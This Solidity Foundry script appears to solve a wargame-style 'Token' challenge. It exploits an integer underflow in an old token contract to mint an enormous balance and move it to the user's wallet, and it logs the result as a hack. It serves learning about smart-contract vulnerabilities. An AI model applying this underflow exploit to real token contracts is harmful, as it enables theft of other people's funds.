// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";


interface Token {
   function balances(address) external view returns(uint256);
   function totalSupply() external view returns(uint256);
   function balanceOf(address) external view returns(uint256);
   function transfer(address, uint256) external returns(bool);
}

contract TokenReceiver {
    
    Token public token = Token(0x1d6df69F65b9B856177CF950d6932d3F356Ef5eC);

    /**
    * Solution: causes underflow as the contract users version 0.6.0 
    */
    function sendAllTokens(address _receiver) external {
        uint256 amountOfTokens = token.balanceOf(address(this));
        token.transfer(_receiver, amountOfTokens - 21);
    }

}

contract TokenScript is Script {

    Token public token = Token(0x1d6df69F65b9B856177CF950d6932d3F356Ef5eC);

    TokenReceiver tokenReceiver = new TokenReceiver();

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        token.transfer(address(tokenReceiver), type(uint256).max);
        tokenReceiver.sendAllTokens(vm.envAddress("WALLLET_ADDRESS"));
        console.log("1. Amount of tokens after hack", token.balanceOf(vm.envAddress("WALLLET_ADDRESS"))); 
        vm.stopBroadcast();
    }
}